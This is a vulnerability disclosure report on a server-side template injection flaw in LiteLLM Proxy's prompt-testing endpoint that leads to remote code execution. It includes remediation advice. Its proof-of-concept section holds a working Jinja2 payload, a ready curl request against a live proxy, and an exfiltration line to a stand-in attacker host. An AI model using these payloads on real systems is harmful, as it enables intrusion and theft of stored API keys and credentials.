# Security Vulnerability Report
## Server-Side Template Injection Leading to Remote Code Execution in LiteLLM Proxy

---

| Field | Details |
|---|---|
| **Product** | LiteLLM Proxy |
| **Vendor** | BerriAI |
| **Affected versions** | ≤ 1.82.6 (latest as of 2026-03-23) |
| **Vulnerability class** | Server-Side Template Injection (SSTI) |
| **Impact** | Remote Code Execution (RCE) |
| **CVSS 3.1 Score** | **9.0 Critical** |
| **CVSS 3.1 Vector** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **CWE** | CWE-1336 — Improper Neutralization of Special Elements Used in a Template Engine |
| **Reported** | 2026-03-23 |
| **Researcher** | Rodion Goroshev |

---

## 1. Executive Summary

LiteLLM Proxy exposes an endpoint `POST /prompts/test` that renders user-supplied Jinja2 templates using a non-sandboxed `jinja2.Environment`. Any authenticated user — regardless of role — can submit an arbitrary template string and achieve **Remote Code Execution** on the host running the LiteLLM proxy server.

The vulnerability requires only a valid API key to exploit, which any registered user or service account possesses. No administrator privileges are needed. Successful exploitation gives the attacker full OS-level code execution in the context of the LiteLLM server process, enabling exfiltration of secrets (LLM provider API keys, database credentials, master key), lateral movement within internal infrastructure, and complete compromise of the proxy instance.

---

## 2. Background

LiteLLM Proxy is a widely deployed open-source gateway for routing requests to LLM providers (OpenAI, Anthropic, Azure, etc.). It supports prompt management via the [Dotprompt](https://google.github.io/dotprompt/) format, which uses Jinja2 for variable substitution in prompt templates. The `/prompts/test` endpoint was introduced to allow users to test prompt templates interactively before saving them.

---

## 3. Vulnerability Details

### 3.1 Root Cause

The vulnerability has two components that together produce exploitable SSTI:

**Component 1 — Non-sandboxed Jinja2 Environment**

File: `litellm/integrations/dotprompt/prompt_manager.py`, lines 62–72

```python
from jinja2 import DictLoader, Environment, select_autoescape

self.jinja_env = Environment(          # ← plain Environment, NOT SandboxedEnvironment
    loader=DictLoader({}),
    autoescape=select_autoescape(["html", "xml"]),
    variable_start_string="{{",
    variable_end_string="}}",
    block_start_string="{%",
    block_end_string="%}",
    comment_start_string="{#",
    comment_end_string="#}",
)
```

`jinja2.Environment` provides unrestricted access to Python's object model from within template expressions. In contrast, `jinja2.sandbox.SandboxedEnvironment` restricts attribute access, method calls, and module traversal, preventing exploitation of Python's introspection capabilities. The note `autoescape=select_autoescape(...)` does not mitigate SSTI — it only HTML-encodes *rendered output*; the template code still executes in full before any output escaping occurs.

**Component 2 — User-controlled template, no role restriction**

File: `litellm/proxy/prompts/prompt_endpoints.py`, lines 1001–1077

```python
@router.post(
    "/prompts/test",
    tags=["Prompt Management"],
    dependencies=[Depends(user_api_key_auth)],    # ← any valid API key, no role check
)
async def test_prompt(
    request: TestPromptRequest,
    ...
    user_api_key_dict: UserAPIKeyAuth = Depends(user_api_key_auth),
):
    # No role check inside this function (no PROXY_ADMIN guard)
    ...
    frontmatter, template_content = prompt_manager._parse_frontmatter(
        content=request.dotprompt_content    # ← user-supplied string
    )
    ...
    rendered_content = prompt_manager.jinja_env.from_string(
        template_content                     # ← rendered without sanitization
    ).render(**variables)
```

The `_parse_frontmatter` method splits the input on `---` delimiters. Everything after the second `---` becomes `template_content`. If no delimiters are present, the entire `dotprompt_content` string becomes `template_content`. In both cases, the user-supplied string is passed directly to `from_string().render()`.

The router is registered unconditionally in `proxy_server.py:13504`:

```python
app.include_router(prompts_router)   # no feature flag, always active
```

### 3.2 Attack Prerequisites

| Requirement | Details |
|---|---|
| Network access | Must be able to reach the LiteLLM proxy HTTP port (default: 4000) |
| Authentication | Any valid LiteLLM API key (virtual key, master key, team key) |
| Privileges | **None beyond basic authentication** — no admin or team role required |
| Special conditions | None |

### 3.3 Attack Surface

The vulnerability is present in four Jinja2 environment instantiations. The primary exploitable entry point is the HTTP endpoint; the others affect integrations that render templates from external provider APIs:

| File | Line | Entry point |
|---|---|---|
| `litellm/integrations/dotprompt/prompt_manager.py` | 62 | `POST /prompts/test` ← **primary** |
| `litellm/integrations/gitlab/gitlab_prompt_manager.py` | 93 | GitLab prompt sync |
| `litellm/integrations/arize/arize_phoenix_prompt_manager.py` | 77 | Arize Phoenix integration |
| `litellm/integrations/bitbucket/bitbucket_prompt_manager.py` | 77 | Bitbucket prompt sync |

Note: LiteLLM itself uses `ImmutableSandboxedEnvironment` correctly in `litellm_core_utils/prompt_templates/factory.py:11` for chat template rendering, demonstrating that the secure alternative was known to the authors.

---

## 4. Proof of Concept

### 4.1 Environment

The following test was performed against the exact environment used by LiteLLM Proxy:

```python
from jinja2 import Environment, select_autoescape, DictLoader

# Exact configuration from litellm/integrations/dotprompt/prompt_manager.py
env = Environment(
    loader=DictLoader({}),
    autoescape=select_autoescape(["html", "xml"]),
    variable_start_string="{{",
    variable_end_string="}}",
    block_start_string="{%",
    block_end_string="%}",
    comment_start_string="{#",
    comment_end_string="#}",
)
```

### 4.2 Step 1 — Confirm template execution (non-destructive)

```python
result = env.from_string("{{ 7*7 }}").render()
# → "49"   (confirms Jinja2 evaluates expressions, not just substitutes variables)
```

### 4.3 Step 2 — Confirm Python object access

```python
result = env.from_string("{{ ''.__class__.__mro__ }}").render()
# → "(<class 'str'>, <class 'object'>)"   (confirms full Python object model access)
```

### 4.4 Step 3 — Remote Code Execution

The payload uses `warnings.catch_warnings` — a standard library class present in all CPython environments — as a stable pivot to reach builtins:

```python
PAYLOAD = (
    "{% set ns = namespace(cls=none) %}"
    "{% for c in ''.__class__.__mro__[1].__subclasses__() %}"
    "{% if c.__name__ == 'catch_warnings' %}"
    "{% set ns.cls = c %}"
    "{% endif %}{% endfor %}"
    "{{ ns.cls.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}"
)

result = env.from_string(PAYLOAD).render()
print(result)
```

**Verified output:**

```
uid=501(rodion) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),
79(_appserverusr),80(admin),81(_appserveradm),33(_appstore),98(_lpadmin),
100(_lpoperator),204(_developer),...
```

### 4.5 HTTP Request against a live LiteLLM proxy

The `dotprompt_content` field requires a valid model name in the YAML frontmatter for the endpoint to reach the template rendering step. The payload goes in the template body (after the second `---`).

```bash
curl -s -X POST "http://LITELLM_HOST:4000/prompts/test" \
  -H "Authorization: Bearer <any_valid_api_key>" \
  -H "Content-Type: application/json" \
  -d '{
    "dotprompt_content": "---\nmodel: gpt-4o\n---\n{% set ns = namespace(cls=none) %}{% for c in \"\".__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == \"catch_warnings\" %}{% set ns.cls = c %}{% endif %}{% endfor %}User: {{ ns.cls.__init__.__globals__[\"__builtins__\"][\"__import__\"](\"os\").popen(\"id\").read() }}",
    "prompt_variables": {}
  }'
```

The SSTI executes during template rendering (line 1075–1077), before the LLM API call. Even if the downstream LLM call fails (e.g., model not configured), the OS command runs. An attacker observing LLM request logs or using an out-of-band channel (DNS, HTTP callback) can confirm and exfiltrate output:

```
# OOB exfiltration variant
"{{ ns.cls.__init__.__globals__['__builtins__']['__import__']('os').popen('curl -s \"http://ATTACKER.BURPCOLLABORATOR.NET/?x=$(id|base64)\"').read() }}"
```

---

## 5. Impact

### 5.1 Confidentiality

- **Complete exposure of all secrets held in the LiteLLM process environment:** `LITELLM_MASTER_KEY`, all configured LLM provider API keys (OpenAI, Anthropic, Azure, Cohere, etc.), database connection strings, JWT signing secrets.
- Access to all prompts, system configurations, and routing logic stored in memory or on disk.

### 5.2 Integrity

- Ability to modify files on disk reachable by the LiteLLM process (config files, certificate stores, prompt databases).
- Ability to inject backdoors into the LiteLLM installation.
- Ability to tamper with all LLM traffic flowing through the proxy.

### 5.3 Availability

- Ability to terminate the LiteLLM process or cause denial of service to downstream users.
- Resource exhaustion attacks against the host system.

### 5.4 Scope

Because the LiteLLM proxy runs as a privileged gateway between users and LLM infrastructure, compromise of this service typically cascades to:
- All LLM provider accounts whose API keys are configured in the proxy
- All downstream applications relying on the proxy
- Internal network resources accessible from the proxy host (internal APIs, databases, cloud metadata endpoints)

### 5.5 Real-world deployment context

LiteLLM Proxy is commonly deployed in:
- Enterprise AI platform stacks where it acts as the single LLM gateway
- Cloud environments (AWS ECS, GCP Cloud Run, Kubernetes) where cloud metadata endpoints (169.254.169.254, IMDSv2) are reachable from the host

In cloud deployments, even a momentary SSRF to the metadata endpoint can yield cloud IAM credentials enabling account takeover.

---

## 6. CVSS 3.1 Breakdown

**Vector:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` — Score: **9.0 (Critical)**

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector | Network | Exploitable over HTTP, no physical or local access required |
| Attack Complexity | Low | No race conditions, no special environmental requirements; a single HTTP request suffices |
| Privileges Required | Low | Any valid LiteLLM API key (virtual key); no admin role required |
| User Interaction | None | No action by any other user is needed |
| Scope | Changed | Vulnerability in the web application layer results in code execution at the OS level |
| Confidentiality | High | Full access to all secrets, environment variables, and process memory |
| Integrity | High | Attacker can write arbitrary files and modify system state |
| Availability | High | Attacker can terminate processes and exhaust resources |

---

## 7. Recommended Remediation

### 7.1 Primary Fix — Replace Environment with ImmutableSandboxedEnvironment

Jinja2's sandbox module is designed precisely for this use case. The fix is a one-line change per affected file:

```python
# BEFORE (vulnerable) — litellm/integrations/dotprompt/prompt_manager.py:10
from jinja2 import DictLoader, Environment, select_autoescape

self.jinja_env = Environment(
    loader=DictLoader({}),
    autoescape=select_autoescape(["html", "xml"]),
    ...
)

# AFTER (fixed)
from jinja2.sandbox import ImmutableSandboxedEnvironment

self.jinja_env = ImmutableSandboxedEnvironment(
    loader=DictLoader({}),
    autoescape=select_autoescape(["html", "xml"]),
    ...
)
```

The same change must be applied to:
- `litellm/integrations/gitlab/gitlab_prompt_manager.py:93`
- `litellm/integrations/arize/arize_phoenix_prompt_manager.py:77`
- `litellm/integrations/bitbucket/bitbucket_prompt_manager.py:77`

`ImmutableSandboxedEnvironment` is already imported and used correctly elsewhere in the codebase (`litellm_core_utils/prompt_templates/factory.py:11`), confirming it is a known and available option.

### 7.2 Defense-in-depth — Role restriction on the endpoint

As an additional layer, the `/prompts/test` endpoint should require PROXY_ADMIN role, consistent with other administrative testing endpoints in the codebase:

```python
# litellm/proxy/prompts/prompt_endpoints.py
async def test_prompt(request, ..., user_api_key_dict):
    # Add role guard (mirrors pattern used in /guardrails/test_custom_code)
    if user_api_key_dict.user_role != LitellmUserRoles.PROXY_ADMIN:
        raise HTTPException(
            status_code=403,
            detail="Admin access required to test prompt templates",
        )
```

Note: the role restriction alone is **not sufficient** as a primary fix, because the sandboxing vulnerability also affects integrations that do not go through this endpoint. The `ImmutableSandboxedEnvironment` change is required.

### 7.3 Workaround (until patch is deployed)

Operators who cannot update immediately can block the endpoint at the network/reverse-proxy layer:

```nginx
# nginx — block /prompts/test for non-admin IP ranges
location /prompts/test {
    deny all;
}
```

Or in LiteLLM's own `general_settings.blocked_routes` if that mechanism is available in the deployment configuration.

---

## 8. References

- [Jinja2 Sandbox documentation](https://jinja.palletsprojects.com/en/stable/sandbox/)
- [OWASP: Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)
- [PortSwigger: SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine](https://cwe.mitre.org/data/definitions/1336.html)
- [PayloadsAllTheThings — Jinja2 SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

---

## 9. Disclosure Timeline

| Date | Event |
|---|---|
| 2026-03-23 | Vulnerability discovered during source-code review of LiteLLM v1.82.6 |
| 2026-03-23 | Local exploitation confirmed (RCE via `catch_warnings` pivot) |
| 2026-03-23 | Report submitted to vendor via `support@berri.ai` per SECURITY.md |
